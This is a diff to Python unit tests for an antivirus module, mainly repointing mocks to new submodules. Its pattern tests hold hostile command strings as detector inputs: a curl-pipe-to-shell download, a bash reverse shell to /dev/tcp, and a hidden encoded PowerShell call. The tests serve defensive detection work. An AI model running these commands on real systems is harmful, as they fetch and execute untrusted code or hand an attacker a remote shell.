@@ -7,7 +7,7 @@ from pathlib import Path
 from unittest import mock
 
 from nexo.core import antivirus as av
-from nexo.core import util
+from nexo.core import av_checks, av_quarantine, util
 
 
 def _blocked(*_a, **_k):
@@ -20,7 +20,8 @@ class TempConfig(unittest.TestCase):
         self.addCleanup(self.tmp.cleanup)
         for p in (mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": self.tmp.name, "APPDATA": self.tmp.name}),
                   mock.patch.object(util, "_settings", None),
-                  mock.patch.object(av, "run_root", _blocked)):
+                  mock.patch.object(av, "run_root", _blocked),
+                  mock.patch.object(av_quarantine, "run_root", _blocked)):
             p.start()
             self.addCleanup(p.stop)
         self.work = Path(self.tmp.name) / "trabalho"
@@ -92,7 +93,7 @@ class Quarantine(TempConfig):
 
     def test_parallel_quarantines_get_unique_ids(self):
         files = [self.make(f"f{i}.exe", data=f"ficheiro {i}".encode()) for i in range(12)]
-        with mock.patch.object(av.time, "time", return_value=1_700_000_000.0):   # mesmo milissegundo
+        with mock.patch.object(av_quarantine.time, "time", return_value=1_700_000_000.0):   # mesmo milissegundo
             threads = [threading.Thread(target=av.quarantine, args=(str(f), "teste")) for f in files]
             for t in threads:
                 t.start()
@@ -131,7 +132,7 @@ class Ignore(TempConfig):
 
 class Patterns(unittest.TestCase):
     def test_linux_commands(self):
-        with mock.patch.object(av, "IS_WIN", False):
+        with mock.patch.object(av_checks, "IS_WIN", False):
             self.assertEqual(av._match("curl http://x.example/a.sh | sh")[0], av.WARN)
             self.assertEqual(av._match("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")[0], av.BAD)
             self.assertIsNone(av._match("ls -la /home"))
@@ -140,7 +141,7 @@ class Patterns(unittest.TestCase):
             self.assertIsNotNone(av._match("/tmp/script.sh"))
 
     def test_windows_commands(self):
-        with mock.patch.object(av, "IS_WIN", True):
+        with mock.patch.object(av_checks, "IS_WIN", True):
             self.assertEqual(av._match("powershell -w hidden -enc " + "A" * 60)[0], av.BAD)
             self.assertIsNone(av._match(r"C:\Program Files\Steam\steam.exe -silent"))
 
